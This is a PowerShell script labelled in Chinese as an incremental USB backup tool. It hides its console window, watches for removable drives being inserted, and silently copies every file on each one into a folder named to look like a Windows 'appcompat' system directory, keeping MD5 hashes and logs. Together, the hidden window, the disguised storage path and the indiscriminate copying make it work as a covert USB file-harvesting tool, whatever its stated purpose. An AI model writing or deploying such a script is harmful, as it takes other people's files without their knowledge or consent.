# U盘智能增量备份脚本 - 2026-03-03 最终兼容版（修复 GetRelativePath 错误）
# 功能：备份所有文件 + 详细日志 + 更长等待时间
# 修正：1. 移除 -AsHashtable（兼容 PowerShell 5.1）
#       2. 移除 [System.IO.Path]::GetRelativePath（兼容 .NET 4.0+）

# 隐藏窗口
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ================== 可修改部分 ==================
$savePath = "D:\ProgramDate\appcompat\usb"
# ===============================================

Unregister-Event -SourceIdentifier "USBInsert" -ErrorAction SilentlyContinue

$global:LogFile = $null

function Write-Log {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $global:LogFile -Append -Encoding UTF8
}

function Copy-FilesFromDrive {
    param([string]$driveLetter)

    try {
        $drivePath = "$driveLetter\"

        # ================== 调试日志 ==================
        Write-Log "=== 开始备份处理 ==="
        Write-Log "U盘驱动器: $driveLetter"
        Write-Log "扫描路径: $drivePath"

        # 等待U盘完全挂载（关键修复！）
        Start-Sleep -Seconds 8
        Write-Log "已等待8秒，U盘应已完全就绪"

        # 获取U盘唯一标识
        $volume = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$driveLetter'" -ErrorAction SilentlyContinue
        $serial = "UNKNOWN"
        if ($volume -and $null -ne $volume.VolumeSerialNumber) {
            $raw = $volume.VolumeSerialNumber.ToString().Trim()
            try {
                if ($raw -match '^[0-9A-Fa-f]{1,8}$') {
                    $serial = "{0:X8}" -f [Convert]::ToUInt32($raw, 16)
                } else {
                    $serial = "{0:X8}" -f [uint32]$raw
                }
            }
            catch { $serial = $raw.ToUpper().PadLeft(8, '0') }
        }
        $label = if ($volume -and $volume.VolumeName) { $volume.VolumeName -replace '[^\w\s-]', '_' } else { "无名称" }
        $usbID = "${label}_$serial"

        $usbBasePath = Join-Path $savePath "U盘备份_$usbID"
        if (-not (Test-Path $usbBasePath)) { New-Item -ItemType Directory -Path $usbBasePath -Force | Out-Null }

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $backupFolder = Join-Path $usbBasePath "备份_$timestamp"
        New-Item -ItemType Directory -Path $backupFolder -Force | Out-Null

        # ========== 修正：兼容旧版 PowerShell 的哈希缓存加载 ==========
        $hashCachePath = Join-Path $usbBasePath "FileHashCache.json"
        $hashCache = @{}
        if (Test-Path $hashCachePath) {
            $jsonContent = Get-Content $hashCachePath -Raw -Encoding UTF8
            if ($jsonContent) {
                $obj = $jsonContent | ConvertFrom-Json
                $obj.PSObject.Properties | ForEach-Object { $hashCache[$_.Name] = $_.Value }
            }
        }

        $global:LogFile = Join-Path $backupFolder "USBCopyLog.txt"
        Write-Log "备份路径: $backupFolder"

        # ================== 列出U盘根目录内容 ==================
        Write-Log "=== U盘根目录内容 ==="
        $rootItems = Get-ChildItem -Path $drivePath -Force -ErrorAction SilentlyContinue
        Write-Log "根目录共有 $($rootItems.Count) 个项目（文件+文件夹）"
        foreach ($item in $rootItems) {
            Write-Log "  - $($item.Name)  $($item.Length/1KB -f '0.00') KB"
        }

        # ================== 扫描所有文件 ==================
        $files = Get-ChildItem -Path $drivePath -Recurse -File -Force -ErrorAction SilentlyContinue

        Write-Log "=== 递归扫描结果 ==="
        Write-Log "共扫描到 $($files.Count) 个文件"

        $totalCopied = 0
        $totalSkipped = 0

        foreach ($file in $files) {
            try {
                # ========== 修正：手动计算相对路径（兼容所有 .NET 版本） ==========
                if ($file.FullName.StartsWith($drivePath, [StringComparison]::OrdinalIgnoreCase)) {
                    $relativePath = $file.FullName.Substring($drivePath.Length).TrimStart('\')
                } else {
                    # 备用方案：如果开头不匹配（理论上不会发生），直接使用文件名
                    $relativePath = $file.Name
                    Write-Log "警告：文件路径与预期不符，使用文件名作为相对路径: $relativePath"
                }

                $currentHash = (Get-FileHash -Path $file.FullName -Algorithm MD5).Hash
                $cacheKey = $relativePath.ToLower()

                $shouldCopy = $true
                if ($hashCache.ContainsKey($cacheKey) -and $hashCache[$cacheKey] -eq $currentHash) {
                    $shouldCopy = $false
                }

                if ($shouldCopy) {
                    $destPath = Join-Path $backupFolder $relativePath
                    $destDir = Split-Path $destPath -Parent
                    if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }

                    Copy-Item -Path $file.FullName -Destination $destPath -Force
                    $totalCopied++
                    Write-Log "已复制: $relativePath  (大小: $($file.Length/1MB -f '0.00') MB)"

                    $hashCache[$cacheKey] = $currentHash
                } else {
                    $totalSkipped++
                }
            }
            catch {
                Write-Log "处理失败 $($file.FullName): $($_.Exception.Message)"
            }
        }

        $hashCache | ConvertTo-Json -Depth 10 | Set-Content -Path $hashCachePath -Encoding UTF8

        Write-Log "本次完成！扫描 $($files.Count) 个文件 → 新增/修改 $totalCopied 个，跳过 $totalSkipped 个"
    }
    catch {
        Write-Log "严重错误: $($_.Exception.Message)"
    }
}

# 启动日志
if (-not (Test-Path $savePath)) { New-Item -ItemType Directory -Path $savePath -Force | Out-Null }
$global:LogFile = Join-Path $savePath "脚本启动日志.txt"
Write-Log "=== 全文件智能增量备份脚本（最终兼容版）已启动 ==="

try {
    Register-WmiEvent -Query "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2" -SourceIdentifier "USBInsert" -Action {
        $driveLetter = $Event.SourceEventArgs.NewEvent.DriveName
        if ($driveLetter) {
            $drive = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$driveLetter'" -ErrorAction SilentlyContinue
            if ($drive -and $drive.DriveType -eq 2) {
                & Copy-FilesFromDrive -driveLetter $driveLetter
            }
        }
    }

    while ($true) { Start-Sleep -Seconds 5 }
}
catch {
    Write-Log "监听错误: $($_.Exception.Message)"
}